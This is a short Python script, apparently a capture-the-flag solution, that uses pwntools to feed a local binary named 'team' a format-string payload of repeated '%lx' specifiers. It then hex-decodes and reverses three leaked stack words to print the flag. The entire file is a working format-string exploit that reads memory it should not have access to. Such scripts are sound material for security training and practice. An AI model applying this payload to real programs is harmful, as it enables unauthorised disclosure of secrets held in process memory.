from pwn import *
from binascii import unhexlify

p = process("./team")

p.sendlineafter(b": ", b"-%lx"*60)
p.sendlineafter(b": ", b"hello")

flags = p.recv().split(b"-")

res = b""
for i in range(10, 13):
	res += unhexlify(flags[i])[::-1]

print(res.decode('utf-8'))
